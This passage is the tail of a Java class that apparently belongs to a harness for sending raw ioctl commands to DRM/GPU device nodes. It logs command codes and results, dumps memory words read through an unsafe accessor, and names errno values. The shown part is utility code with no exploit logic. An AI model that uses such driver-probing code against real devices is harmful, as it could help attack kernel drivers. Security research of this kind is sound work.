            + Long.toHexString(id) + ", cleaning up");
        ioctlAndPrint(fd, name + "_cleanup", freeCmd, mem);
    }

    private static long ioctlAndPrint(int fd, String name, long cmd, long arg)
            throws Exception {
        long ret = DrmTrigger.rawIoctl(fd, cmd, arg);
        System.out.println("[*] " + pad(name, 18)
            + " cmd=0x" + Long.toHexString(cmd)
            + " ret=" + retText(ret));
        return ret;
    }

    private static void dumpU32Words(String name, long addr, int len)
            throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("    ").append(name).append(":");
        for (int off = 0; off < len; off += 4) {
            sb.append(" [").append(off).append("]=0x")
              .append(Integer.toHexString(DrmTrigger.unsafeGetInt(addr + off)));
        }
        System.out.println(sb.toString());
    }

    private static String retText(long ret) {
        if (ret >= 0) {
            return Long.toString(ret);
        }
        return ret + " (" + errnoName(-ret) + ")";
    }

    private static String errnoName(long errno) {
        if (errno == 1) return "EPERM";
        if (errno == 2) return "ENOENT";
        if (errno == 5) return "EIO";
        if (errno == 9) return "EBADF";
        if (errno == 12) return "ENOMEM";
        if (errno == 13) return "EACCES";
        if (errno == 14) return "EFAULT";
        if (errno == 16) return "EBUSY";
        if (errno == 19) return "ENODEV";
        if (errno == 22) return "EINVAL";
        if (errno == 25) return "ENOTTY";
        if (errno == 75) return "EOVERFLOW";
        if (errno == 95) return "EOPNOTSUPP";
        if (errno == 110) return "ETIMEDOUT";
        return "errno=" + errno;
    }

    private static String fdLabel(String path) {
        String s = path;
        if (s.startsWith("/dev/")) {
            s = s.substring(5);
        }
        return s.replace('/', '_').replace('-', '_').replace('.', '_');
    }

    private static String pad(String s, int width) {
        StringBuilder sb = new StringBuilder(s);
        while (sb.length() < width) {
            sb.append(' ');
        }
        return sb.toString();
    }
}
